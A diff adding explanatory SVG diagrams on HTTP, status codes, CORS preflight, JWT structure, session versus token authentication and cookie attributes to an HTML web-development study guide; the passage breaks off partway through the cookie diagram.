@@ -28,6 +28,74 @@
 
 <h2 class="g-h2">1. HTTP Methods &amp; Status Codes</h2>
 
+<!-- DIAGRAM 1: HTTP request/response cycle -->
+<figure class="fig-dia">
+  <svg viewBox="0 0 830 350" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="HTTP request/response cycle showing client, DNS, and server with annotated packet structure">
+    <defs>
+      <marker id="arr1" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+        <path d="M0,0 L8,4 L0,8 z" fill="var(--fg)"/>
+      </marker>
+    </defs>
+    <!-- Client box -->
+    <rect x="16" y="120" width="120" height="56" rx="6" fill="var(--surface)" stroke="var(--border-strong)" stroke-width="1.5"/>
+    <text x="76" y="145" text-anchor="middle" font-family="var(--f-body)" font-size="13" font-weight="700" fill="var(--fg)">Browser</text>
+    <text x="76" y="163" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg-muted)">(client)</text>
+    <!-- DNS box -->
+    <rect x="230" y="24" width="120" height="56" rx="6" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1.5"/>
+    <text x="290" y="49" text-anchor="middle" font-family="var(--f-body)" font-size="13" font-weight="700" fill="var(--fg)">DNS Server</text>
+    <text x="290" y="67" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg-muted)">api.example.com</text>
+    <!-- Server box -->
+    <rect x="440" y="120" width="120" height="56" rx="6" fill="var(--surface)" stroke="var(--border-strong)" stroke-width="1.5"/>
+    <text x="500" y="145" text-anchor="middle" font-family="var(--f-body)" font-size="13" font-weight="700" fill="var(--fg)">Server</text>
+    <text x="500" y="163" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg-muted)">93.184.216.34</text>
+    <!-- DNS lookup arrow up -->
+    <line x1="176" y1="140" x2="280" y2="80" stroke="var(--warning)" stroke-width="1.5" marker-end="url(#arr1)"/>
+    <text x="200" y="102" font-family="var(--f-mono)" font-size="10" fill="var(--warning)">1. DNS lookup</text>
+    <!-- DNS reply arrow down -->
+    <line x1="280" y1="80" x2="176" y2="140" stroke="var(--warning)" stroke-width="1" stroke-dasharray="4 3" marker-end="url(#arr1)"/>
+    <text x="178" y="120" font-family="var(--f-mono)" font-size="10" fill="var(--warning)">2. IP addr</text>
+    <!-- Request arrow -->
+    <line x1="136" y1="148" x2="440" y2="148" stroke="var(--accent)" stroke-width="2" marker-end="url(#arr1)"/>
+    <text x="288" y="140" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--accent)">3. HTTP Request</text>
+    <!-- Response arrow -->
+    <line x1="440" y1="168" x2="136" y2="168" stroke="var(--success)" stroke-width="2" marker-end="url(#arr1)"/>
+    <text x="288" y="186" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--success)">4. HTTP Response</text>
+    <!-- Zoomed-in packet panel -->
+    <rect x="600" y="8" width="208" height="322" rx="6" fill="var(--bg-raised)" stroke="var(--border-strong)" stroke-width="1.5"/>
+    <text x="704" y="28" text-anchor="middle" font-family="var(--f-body)" font-size="12" font-weight="700" fill="var(--fg)">HTTP Packet anatomy</text>
+    <!-- Request line -->
+    <rect x="612" y="38" width="184" height="28" rx="3" fill="var(--accent)" fill-opacity="0.15" stroke="var(--accent)" stroke-width="1"/>
+    <text x="704" y="51" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--accent)" font-weight="700">Request line</text>
+    <text x="704" y="62" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">GET /api/users HTTP/1.1</text>
+    <!-- Headers -->
+    <rect x="612" y="74" width="184" height="60" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="704" y="88" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg)" font-weight="700">Headers</text>
+    <text x="620" y="101" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">Host: api.example.com</text>
+    <text x="620" y="114" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">Authorization: Bearer ...</text>
+    <text x="620" y="127" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">Content-Type: application/json</text>
+    <!-- Body -->
+    <rect x="612" y="142" width="184" height="36" rx="3" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="704" y="156" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg)" font-weight="700">Body</text>
+    <text x="704" y="172" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">(empty for GET)</text>
+    <!-- Divider -->
+    <line x1="612" y1="192" x2="796" y2="192" stroke="var(--border)" stroke-width="1" stroke-dasharray="4 2"/>
+    <text x="704" y="208" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg-subtle)">&#8595; Response</text>
+    <!-- Status line -->
+    <rect x="612" y="218" width="184" height="28" rx="3" fill="var(--success)" fill-opacity="0.15" stroke="var(--success)" stroke-width="1"/>
+    <text x="704" y="231" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--success)" font-weight="700">Status line</text>
+    <text x="704" y="242" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">HTTP/1.1 200 OK</text>
+    <!-- Resp headers -->
+    <rect x="612" y="254" width="184" height="36" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="704" y="268" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg)" font-weight="700">Headers</text>
+    <text x="620" y="281" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">Content-Type: application/json</text>
+    <text x="620" y="292" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">Set-Cookie: sid=...</text>
+    <!-- Resp body -->
+    <rect x="612" y="298" width="184" height="24" rx="3" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="704" y="315" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg)" font-weight="700">Body  {"id":42,...}</text>
+  </svg>
+  <figcaption>A full HTTP cycle: the browser resolves DNS, sends an annotated request packet, and receives a status-line + headers + body response.</figcaption>
+</figure>
+
 <h3 class="g-h3">HTTP Methods</h3>
 
 <div class="tw"><table>
@@ -133,6 +201,49 @@ console.log(res.status); // 200 or 404
 
 // OPTIONS — preflight; browser sends this automatically (rarely called manually)
 const res = await fetch('/api/users', { method: 'OPTIONS' });</pre></div>
+
+<!-- DIAGRAM 2: Status code families -->
+<figure class="fig-dia">
+  <svg viewBox="0 0 830 210" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="HTTP status code families: 2xx success, 3xx redirect, 4xx client error, 5xx server error">
+    <!-- 2xx bucket -->
+    <rect x="16" y="24" width="184" height="160" rx="6" fill="var(--success)" fill-opacity="0.12" stroke="var(--success)" stroke-width="2"/>
+    <text x="108" y="48" text-anchor="middle" font-family="var(--f-body)" font-size="14" font-weight="700" fill="var(--success)">2xx Success</text>
+    <text x="108" y="68" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">200 OK</text>
+    <text x="108" y="86" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">201 Created</text>
+    <text x="108" y="104" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">204 No Content</text>
+    <text x="108" y="126" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">Request succeeded.</text>
+    <text x="108" y="142" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">Body may or may</text>
+    <text x="108" y="158" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">not be returned.</text>
+    <!-- 3xx bucket -->
+    <rect x="216" y="24" width="184" height="160" rx="6" fill="var(--warning)" fill-opacity="0.12" stroke="var(--warning)" stroke-width="2"/>
+    <text x="308" y="48" text-anchor="middle" font-family="var(--f-body)" font-size="14" font-weight="700" fill="var(--warning)">3xx Redirect</text>
+    <text x="308" y="68" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">301 Moved Permanently</text>
+    <text x="308" y="86" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">302 Found (temp)</text>
+    <text x="308" y="104" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">304 Not Modified</text>
+    <text x="308" y="126" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">Browser should follow</text>
+    <text x="308" y="142" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">Location: header to</text>
+    <text x="308" y="158" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">find the resource.</text>
+    <!-- 4xx bucket -->
+    <rect x="416" y="24" width="184" height="160" rx="6" fill="var(--danger)" fill-opacity="0.12" stroke="var(--danger)" stroke-width="2"/>
+    <text x="508" y="48" text-anchor="middle" font-family="var(--f-body)" font-size="14" font-weight="700" fill="var(--danger)">4xx Client Error</text>
+    <text x="508" y="68" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">400 Bad Request</text>
+    <text x="508" y="86" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">401 Unauthorized</text>
+    <text x="508" y="104" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">403 Forbidden</text>
+    <text x="508" y="120" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">404 Not Found</text>
+    <text x="508" y="138" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">Client sent something</text>
+    <text x="508" y="154" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">wrong. Client's fault.</text>
+    <!-- 5xx bucket -->
+    <rect x="616" y="24" width="188" height="160" rx="6" fill="oklch(0.60 0.10 320)" fill-opacity="0.12" stroke="oklch(0.60 0.10 320)" stroke-width="2"/>
+    <text x="710" y="48" text-anchor="middle" font-family="var(--f-body)" font-size="14" font-weight="700" fill="oklch(0.60 0.10 320)">5xx Server Error</text>
+    <text x="710" y="68" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">500 Internal Error</text>
+    <text x="710" y="86" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">502 Bad Gateway</text>
+    <text x="710" y="104" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">503 Service Unavail.</text>
+    <text x="710" y="126" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">Something broke on</text>
+    <text x="710" y="142" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">the server. Server's</text>
+    <text x="710" y="158" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">fault.</text>
+  </svg>
+  <figcaption>The four HTTP status families — colour coded by responsibility: success (2xx), redirect (3xx), client fault (4xx), server fault (5xx).</figcaption>
+</figure>
 
 <h3 class="g-h3">HTTP Status Codes — Must Know</h3>
 
@@ -420,6 +531,54 @@ const response = await fetch('/api/data', {
   <li><code>https://app.com:3000</code> → <code>https://app.com:4000</code> (different port)</li>
 </ul>
 
+<!-- DIAGRAM 3: CORS preflight sequence diagram -->
+<figure class="fig-dia">
+  <svg viewBox="0 0 710 350" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="CORS preflight sequence: browser sends OPTIONS then the real request">
+    <defs>
+      <marker id="arr3" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+        <path d="M0,0 L8,4 L0,8 z" fill="var(--fg)"/>
+      </marker>
+      <marker id="arr3g" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+        <path d="M0,0 L8,4 L0,8 z" fill="var(--success)"/>
+      </marker>
+    </defs>
+    <!-- Lane headers -->
+    <rect x="16" y="8" width="200" height="40" rx="6" fill="var(--accent)" fill-opacity="0.18" stroke="var(--accent)" stroke-width="1.5"/>
+    <text x="116" y="33" text-anchor="middle" font-family="var(--f-body)" font-size="13" font-weight="700" fill="var(--accent)">Browser (Client)</text>
+    <rect x="484" y="8" width="200" height="40" rx="6" fill="var(--surface-alt)" stroke="var(--border-strong)" stroke-width="1.5"/>
+    <text x="584" y="33" text-anchor="middle" font-family="var(--f-body)" font-size="13" font-weight="700" fill="var(--fg)">Server (api.com)</text>
+    <!-- Life lines -->
+    <line x1="116" y1="48" x2="116" y2="332" stroke="var(--accent)" stroke-width="1" stroke-dasharray="4 3"/>
+    <line x1="584" y1="48" x2="584" y2="332" stroke="var(--border)" stroke-width="1" stroke-dasharray="4 3"/>
+    <!-- Step 1: OPTIONS -->
+    <text x="116" y="74" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-subtle)">Step 1</text>
+    <line x1="116" y1="84" x2="584" y2="84" stroke="var(--warning)" stroke-width="2" marker-end="url(#arr3)"/>
+    <text x="350" y="78" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--warning)">OPTIONS /api/data</text>
+    <!-- OPTIONS headers block -->
+    <rect x="140" y="92" width="420" height="60" rx="3" fill="var(--surface)" stroke="var(--warning)" stroke-width="1"/>
+    <text x="152" y="108" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">Origin: https://app.com</text>
+    <text x="152" y="122" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">Access-Control-Request-Method: DELETE</text>
+    <text x="152" y="136" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">Access-Control-Request-Headers: Authorization</text>
+    <!-- Step 2: 200 preflight response -->
+    <text x="584" y="170" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-subtle)">Step 2</text>
+    <line x1="584" y1="180" x2="116" y2="180" stroke="var(--success)" stroke-width="2" marker-end="url(#arr3g)"/>
+    <text x="350" y="174" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--success)">200 OK (preflight approved)</text>
+    <!-- Preflight response headers block -->
+    <rect x="140" y="188" width="420" height="60" rx="3" fill="var(--surface)" stroke="var(--success)" stroke-width="1"/>
+    <text x="152" y="204" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">Access-Control-Allow-Origin: https://app.com</text>
+    <text x="152" y="218" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">Access-Control-Allow-Methods: GET, POST, DELETE</text>
+    <text x="152" y="232" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">Access-Control-Max-Age: 86400</text>
+    <!-- Step 3: Real request -->
+    <text x="116" y="265" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-subtle)">Step 3</text>
+    <line x1="116" y1="275" x2="584" y2="275" stroke="var(--accent)" stroke-width="2" marker-end="url(#arr3)"/>
+    <text x="350" y="269" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--accent)">DELETE /api/data  (real request)</text>
+    <!-- Real response -->
+    <line x1="584" y1="308" x2="116" y2="308" stroke="var(--fg-muted)" stroke-width="1.5" marker-end="url(#arr3)"/>
+    <text x="350" y="302" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg-muted)">200 OK  (actual response body)</text>
+  </svg>
+  <figcaption>CORS preflight: the browser sends an OPTIONS probe first; only after the server returns the correct Access-Control-Allow-* headers does the real request proceed.</figcaption>
+</figure>
+
 <h3 class="g-h3">Simple vs Preflight Requests</h3>
 
 <p><strong>Simple requests</strong> (no preflight): GET, HEAD, POST with <code>Content-Type: application/x-www-form-urlencoded | multipart/form-data | text/plain</code></p>
@@ -528,6 +687,62 @@ Access-Control-Max-Age: 86400
 <p><strong>Pros:</strong> Easy to invalidate (just delete session from DB)<br>
 <strong>Cons:</strong> Server must store session state — not truly stateless</p>
 
+<!-- DIAGRAM 4: JWT anatomy -->
+<figure class="fig-dia">
+  <svg viewBox="0 0 830 310" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="JWT anatomy: header dot payload dot signature, each decoded into JSON">
+    <!-- Token string -->
+    <text x="16" y="28" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">eyJhbGciOiJIUzI1NiJ9</text>
+    <text x="246" y="28" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">.</text>
+    <text x="256" y="28" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">eyJ1c2VySWQiOiI0MiJ9</text>
+    <text x="486" y="28" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">.</text>
+    <text x="496" y="28" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">SflKxwRJSMeKKF2Q...</text>
+    <!-- Colour underlines -->
+    <line x1="16" y1="32" x2="242" y2="32" stroke="var(--accent)" stroke-width="3"/>
+    <line x1="256" y1="32" x2="482" y2="32" stroke="var(--success)" stroke-width="3"/>
+    <line x1="496" y1="32" x2="700" y2="32" stroke="var(--danger)" stroke-width="3"/>
+    <!-- Labels above decoded panels -->
+    <text x="124" y="52" text-anchor="middle" font-family="var(--f-body)" font-size="12" font-weight="700" fill="var(--accent)">Header</text>
+    <text x="368" y="52" text-anchor="middle" font-family="var(--f-body)" font-size="12" font-weight="700" fill="var(--success)">Payload</text>
+    <text x="598" y="52" text-anchor="middle" font-family="var(--f-body)" font-size="12" font-weight="700" fill="var(--danger)">Signature</text>
+    <!-- Connector lines -->
+    <line x1="124" y1="54" x2="124" y2="70" stroke="var(--accent)" stroke-width="1" stroke-dasharray="3 2"/>
+    <line x1="368" y1="54" x2="368" y2="70" stroke="var(--success)" stroke-width="1" stroke-dasharray="3 2"/>
+    <line x1="598" y1="54" x2="598" y2="70" stroke="var(--danger)" stroke-width="1" stroke-dasharray="3 2"/>
+    <!-- Header JSON box -->
+    <rect x="16" y="70" width="216" height="90" rx="6" fill="var(--surface)" stroke="var(--accent)" stroke-width="1.5"/>
+    <text x="28" y="90" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">{</text>
+    <text x="28" y="107" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">  "alg": "HS256",</text>
+    <text x="28" y="124" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">  "typ": "JWT"</text>
+    <text x="28" y="141" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">}</text>
+    <text x="124" y="174" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg-muted)">Base64url encoded</text>
+    <text x="124" y="186" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg-muted)">(readable by anyone)</text>
+    <!-- Payload JSON box -->
+    <rect x="256" y="70" width="224" height="120" rx="6" fill="var(--surface)" stroke="var(--success)" stroke-width="1.5"/>
+    <text x="268" y="90" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">{</text>
+    <text x="268" y="107" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">  "userId": "42",</text>
+    <text x="268" y="124" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">  "role": "admin",</text>
+    <text x="268" y="141" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">  "iat": 1713670400,</text>
+    <text x="268" y="158" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">  "exp": 1713674000</text>
+    <text x="268" y="175" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">}</text>
+    <text x="368" y="204" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--warning)">NOT secret — anyone can decode!</text>
+    <!-- Signature box -->
+    <rect x="504" y="70" width="300" height="120" rx="6" fill="var(--surface)" stroke="var(--danger)" stroke-width="1.5"/>
+    <text x="516" y="92" font-family="var(--f-body)" font-size="11" font-weight="700" fill="var(--danger)">HMAC_SHA256(</text>
+    <text x="516" y="110" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">  base64(header)</text>
+    <text x="516" y="126" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">  + "."</text>
+    <text x="516" y="142" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">  + base64(payload),</text>
+    <text x="516" y="158" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">  SECRET_KEY</text>
+    <text x="516" y="174" font-family="var(--f-body)" font-size="11" font-weight="700" fill="var(--danger)">)</text>
+    <text x="654" y="204" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg-muted)">Server verifies this. Tamper = mismatch.</text>
+    <!-- Usage line -->
+    <text x="16" y="235" font-family="var(--f-body)" font-size="11" font-weight="700" fill="var(--fg)">Sent as:</text>
+    <rect x="80" y="220" width="520" height="28" rx="3" fill="var(--bg-raised)" stroke="var(--border)" stroke-width="1"/>
+    <text x="90" y="239" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI0MiJ9.SflK...</text>
+    <text x="16" y="275" font-family="var(--f-body)" font-size="11" fill="var(--fg-muted)">Stateless: server re-derives signature on every request — no DB session lookup needed.</text>
+  </svg>
+  <figcaption>JWT = three Base64url segments separated by dots. Header and payload are readable by anyone; only the signature is secret and proves the token was not tampered with.</figcaption>
+</figure>
+
 <h3 class="g-h3">JWT Authentication</h3>
 
 <p><strong>JWT</strong> = JSON Web Token — a self-contained token with 3 parts: <code>header.payload.signature</code></p>
@@ -578,6 +793,71 @@ fetch('/api/profile', {
 <p><strong>Pros:</strong> Stateless, scalable, works cross-domain<br>
 <strong>Cons:</strong> Cannot invalidate before expiry, payload is readable (don't put secrets in it)</p>
 
+<!-- DIAGRAM 5: Session vs Token auth -->
+<figure class="fig-dia">
+  <svg viewBox="0 0 830 310" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Session-based auth versus token-based JWT auth comparison lanes">
+    <defs>
+      <marker id="arr5" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+        <path d="M0,0 L8,4 L0,8 z" fill="var(--fg)"/>
+      </marker>
+    </defs>
+    <!-- Session lane -->
+    <rect x="16" y="8" width="388" height="280" rx="6" fill="var(--surface-alt)" stroke="var(--border-strong)" stroke-width="1.5"/>
+    <text x="210" y="32" text-anchor="middle" font-family="var(--f-body)" font-size="13" font-weight="700" fill="var(--fg)">Session-Based Auth</text>
+    <!-- Session flow boxes -->
+    <rect x="36" y="48" width="100" height="32" rx="6" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="86" y="68" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg)">Browser</text>
+    <rect x="276" y="48" width="108" height="32" rx="6" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="330" y="68" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg)">Server + DB</text>
+    <!-- Login -->
+    <line x1="136" y1="64" x2="276" y2="64" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arr5)"/>
+    <text x="206" y="60" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--accent)">POST /login (creds)</text>
+    <!-- Session created -->
+    <rect x="280" y="100" width="100" height="28" rx="3" fill="var(--warning)" fill-opacity="0.15" stroke="var(--warning)" stroke-width="1"/>
+    <text x="330" y="119" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--warning)">session stored in DB</text>
+    <line x1="276" y1="112" x2="136" y2="112" stroke="var(--success)" stroke-width="1.5" marker-end="url(#arr5)"/>
+    <text x="206" y="108" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--success)">Set-Cookie: sid=abc</text>
+    <!-- Subsequent req -->
+    <line x1="136" y1="155" x2="276" y2="155" stroke="var(--fg-muted)" stroke-width="1.5" marker-end="url(#arr5)"/>
+    <text x="206" y="150" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">GET /profile  (cookie auto-sent)</text>
+    <!-- DB lookup -->
+    <text x="330" y="175" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--warning)">DB lookup for sid</text>
+    <line x1="276" y1="183" x2="136" y2="183" stroke="var(--fg-muted)" stroke-width="1.5" marker-end="url(#arr5)"/>
+    <text x="206" y="179" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">200 OK (user data)</text>
+    <!-- Labels -->
+    <text x="210" y="218" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--danger)">Stateful — server stores session state</text>
+    <text x="210" y="234" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--success)">Easy to invalidate (delete from DB)</text>
+    <text x="210" y="250" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--danger)">Harder to scale horizontally</text>
+    <!-- Token lane -->
+    <rect x="416" y="8" width="388" height="280" rx="6" fill="var(--bg-raised)" stroke="var(--border-strong)" stroke-width="1.5"/>
+    <text x="610" y="32" text-anchor="middle" font-family="var(--f-body)" font-size="13" font-weight="700" fill="var(--fg)">Token-Based Auth (JWT)</text>
+    <rect x="436" y="48" width="100" height="32" rx="6" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="486" y="68" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg)">Browser</text>
+    <rect x="676" y="48" width="108" height="32" rx="6" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="730" y="68" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg)">Server (no DB)</text>
+    <!-- JWT login -->
+    <line x1="536" y1="64" x2="676" y2="64" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arr5)"/>
+    <text x="606" y="60" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--accent)">POST /login (creds)</text>
+    <!-- JWT issued -->
+    <rect x="480" y="100" width="100" height="28" rx="3" fill="var(--accent)" fill-opacity="0.12" stroke="var(--accent)" stroke-width="1"/>
+    <text x="530" y="119" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--accent)">JWT stored client-side</text>
+    <line x1="676" y1="112" x2="536" y2="112" stroke="var(--success)" stroke-width="1.5" marker-end="url(#arr5)"/>
+    <text x="606" y="108" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--success)">200 {token: "eyJ..."}</text>
+    <!-- Subsequent req -->
+    <line x1="536" y1="155" x2="676" y2="155" stroke="var(--fg-muted)" stroke-width="1.5" marker-end="url(#arr5)"/>
+    <text x="606" y="150" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">GET /profile  Authorization: Bearer eyJ...</text>
+    <!-- Verify -->
+    <text x="730" y="175" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--success)">verify signature</text>
+    <line x1="676" y1="183" x2="536" y2="183" stroke="var(--fg-muted)" stroke-width="1.5" marker-end="url(#arr5)"/>
+    <text x="606" y="179" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">200 OK</text>
+    <!-- Labels -->
+    <text x="610" y="218" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--success)">Stateless — server validates signature only</text>
+    <text x="610" y="234" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--danger)">Cannot invalidate before expiry</text>
+    <text x="610" y="250" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--success)">Scales easily across multiple servers</text>
+  </svg>
+  <figcaption>Session auth keeps state on the server (DB lookup per request); JWT auth is stateless — the server only needs the secret key to validate the signature.</figcaption>
+</figure>
+
 <h3 class="g-h3">Token Storage — Where to store JWT?</h3>
 
 <div class="tw"><table>
@@ -616,6 +896,58 @@ fetch('/api/profile', {
     </tr>
   </tbody>
 </table></div>
+
+<!-- DIAGRAM 6: Cookie attributes -->
+<figure class="fig-dia">
+  <svg viewBox="0 0 830 280" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Cookie attributes: HttpOnly, Secure, SameSite, Path, Domain, Expires and what each blocks">
+    <!-- Cookie box -->
+    <rect x="16" y="40" width="300" height="56" rx="6" fill="var(--surface)" stroke="var(--border-strong)" stroke-width="2"/>
+    <text x="166" y="62" text-anchor="middle" font-family="var(--f-mono)" font-size="10" font-weight="700" fill="var(--fg)">Set-Cookie: sessionId=a3f8b2;</text>
+    <text x="166" y="78" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600</text>
+    <!-- HttpOnly -->
+    <rect x="340" y="8" width="220" height="44" rx="6" fill="var(--danger)" fill-opacity="0.12" stroke="var(--danger)" stroke-width="1"/>
+    <text x="450" y="26" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--danger)">HttpOnly</text>
+    <text x="450" y="42" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Blocks: JS document.cookie read (XSS)</text>
+    <line x1="316" y1="56" x2="340" y2="30" stroke="var(--danger)" stroke-width="1" stroke-dasharray="3 2"/>
+    <!-- Secure -->
+    <rect x="580" y="8" width="220" height="44" rx="6" fill="var(--accent)" fill-opacity="0.12" stroke="var(--accent)" stroke-width="1"/>
+    <text x="690" y="26" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--accent)">Secure</text>
+    <text x="690" y="42" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Blocks: sending over plain HTTP</text>
+    <line x1="316" y1="60" x2="580" y2="25" stroke="var(--accent)" stroke-width="1" stroke-dasharray="3 2"/>
+    <!-- SameSite -->
+    <rect x="340" y="68" width="220" height="60" rx="6" fill="var(--warning)" fill-opacity="0.12" stroke="var(--warning)" stroke-width="1"/>
